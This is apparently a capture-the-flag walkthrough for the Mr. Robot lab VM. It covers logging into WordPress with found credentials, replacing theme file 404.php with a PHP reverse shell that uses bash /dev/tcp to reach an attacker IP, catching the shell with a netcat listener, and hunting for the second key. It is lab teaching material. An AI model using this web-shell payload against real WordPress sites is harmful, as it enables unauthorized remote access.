💥 Exploitation – Mr. Robot

In this phase, we use the discovered WordPress credentials to gain shell access on the target system.

---

## 🔐 1. Log into WordPress

Visit:
```

[http://192.168.1.105/wp-login.php](http://192.168.1.105/wp-login.php)

```

Use the credentials:
- **Username**: `elliot`
- **Password**: `ER28-0652`

✅ You should be redirected to the WordPress dashboard.

---

## 🔎 2. Upload a Reverse Shell via Appearance Editor

Navigate to:
```

Appearance → Theme Editor

````

Select:
- `404.php` or `index.php` (a page that's guaranteed to be loaded)

Replace the entire code with a PHP reverse shell. Example:

```php
<?php
// reverse shell payload
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'");
?>
````

> Replace `192.168.1.100` with your attack machine IP.

---

## 🧲 3. Set Up Listener

On your local machine:

```bash
nc -lvnp 4444
```

---

## 🎯 4. Trigger the Shell

Visit:

```
http://192.168.1.105/wp-content/themes/twentytwelve/404.php
```

✅ A reverse shell should connect to your terminal as the `www-data` user.

---

## 🧠 Post-Exploitation Enumeration

Once you have the shell:

```bash
whoami
# www-data

hostname
uname -a
```

---

## 🔎 Search for Key 2

Use `find`:

```bash
find / -name "key-2-of-3.txt" 2>/dev/null
```

Typically located in `/home/robot`.

To read it, you may need to switch users (see next steps).

---

📂 Proceed to [`privilege-escalation.md`](./privilege-escalation.md) to escalate from `www-data` to `robot`, and eventually `root`.
